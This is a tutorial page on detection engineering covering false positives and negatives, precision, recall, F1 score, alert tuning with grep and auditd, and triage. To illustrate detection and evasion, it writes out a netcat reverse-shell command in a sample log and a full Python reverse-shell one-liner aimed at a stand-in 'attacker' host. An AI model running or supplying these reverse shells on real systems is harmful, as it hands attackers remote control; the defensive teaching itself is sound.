# False Negative and False Positive

Detection quality is measured by how well a system distinguishes real threats from benign activity. Every detection system produces four types of outcomes, and understanding them is fundamental to detection engineering.

---

## The Four Outcomes

| | **Prediction: Threat** | **Prediction: Benign** |
| --- | --- | --- |
| **Reality: Threat** | ✅ True Positive (TP) | ❌ False Negative (FN) |
| **Reality: Benign** | ❌ False Positive (FP) | ✅ True Negative (TN) |

---

## False Positive (FP)

A **false positive** occurs when a legitimate, benign event is incorrectly flagged as a threat.

### Impact
- Alert fatigue — analysts stop trusting alerts
- Wasted SOC time investigating non-issues
- Desensitization leads to real attacks being ignored

### Example

A detection rule alerts on any execution of `bash` by `www-data`:

```bash
# Rule trigger (benign):
# nginx spawns bash to run a maintenance script — this fires the alert
# even though it's a legitimate deployment job
```

The alert is a **false positive** — real threat behavior (bash reverse shell as www-data) but also triggered by legitimate CI/CD pipelines.

### Tuning to Reduce FP

```bash
# Before tuning: fires on ALL sudo usage
grep "sudo:.*COMMAND" /var/log/auth.log

# After tuning: suppress known-good commands, surface anomalies only
grep "sudo:.*COMMAND" /var/log/auth.log | \
  grep -vE "(apt|systemctl restart nginx|journalctl)"
```

Output:
```
sudo: deploy : COMMAND=/bin/bash -c 'nc -e /bin/sh attacker 4444'
sudo: www-data : COMMAND=/usr/bin/python3 /tmp/.hidden/payload.py
```

Now only suspicious commands surface.

---

## False Negative (FN)

A **false negative** occurs when a real attack is **not detected** by the system — the most dangerous outcome.

### Impact
- Attacker operates undetected
- Dwell time increases (industry average: 200+ days before detection)
- Damage compounds silently

### Example

An attacker uses `python3` instead of `nc` for a reverse shell — evading a rule that only monitors `nc`:

```bash
# Attacker payload — NOT caught by nc-specific rule:
python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('attacker',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"
```

The rule **fails** because it only looked for `nc -e`. This is a **false negative**.

### Reducing FN — Behavioral Detection

Instead of signature matching on tool names, detect the *behavior*:

```bash
# Detect any process establishing an unexpected outbound connection
# Using auditd to log network connections from suspicious processes
auditctl -a always,exit -F arch=b64 -S connect \
  -F uid=33 -k www_data_outbound
```

```bash
# Review caught events
ausearch -k www_data_outbound | grep -E "saddr|comm"
```

This catches `python3`, `perl`, `ruby`, `bash /dev/tcp`, or any other reverse shell tool.

---

## Precision and Recall

These metrics quantify detection quality:

```
Precision = TP / (TP + FP)   → "Of all alerts fired, how many were real?"
Recall    = TP / (TP + FN)   → "Of all real attacks, how many did we catch?"
```

| Scenario | Precision | Recall | Problem |
| --- | --- | --- | --- |
| Very permissive rule | Low | High | Alert fatigue, FP storm |
| Very strict rule | High | Low | Missing real attacks (FN) |
| Well-tuned rule | High | High | Ideal — hard to achieve |

### F1 Score

The harmonic mean of precision and recall — the target metric for detection rules:

```
F1 = 2 × (Precision × Recall) / (Precision + Recall)
```

A rule with F1 = 1.0 catches all real attacks and fires no false alerts. In practice, F1 > 0.9 is excellent for security detection.

---

## Alert Fatigue Management

### Tiered Alert Severity

```
Critical  → Immediate response required (e.g., active shell on production)
High      → Investigate within 1 hour
Medium    → Review within 8 hours
Low       → Daily batch review
Informational → Logged only, no action
```

### Correlation to Reduce Noise

Single events often fire FPs. Combining multiple signals raises confidence:

```bash
# Single event (FP risk): one failed SSH login
# Correlated (high confidence): 50+ failed logins THEN a successful login
# from the same IP within 10 minutes

journalctl -u ssh --since "30 min ago" | \
  awk '/Failed password/{ip=$NF; count[ip]++} /Accepted password/{print ip, count[ip]}' | \
  awk '$2 > 5'
```

A successful login after many failures = likely brute force success = **True Positive**.

---

## Decision Tree: Triage Workflow

```
Alert fires
    ↓
Is the source IP/user known-good? (e.g., monitoring system, CI/CD bot)
    → Yes → Likely FP → Add to suppression list, document
    → No  → Investigate further
         ↓
Does behavior match a known attack TTP? (check ATT&CK)
    → Yes → Escalate as potential TP
    → No  → Gather more context (parent process, network, timing)
         ↓
Can you reproduce the behavior in a lab?
    → Yes → Confirmed TP or FP
    → No  → Treat as suspicious, monitor
```

---
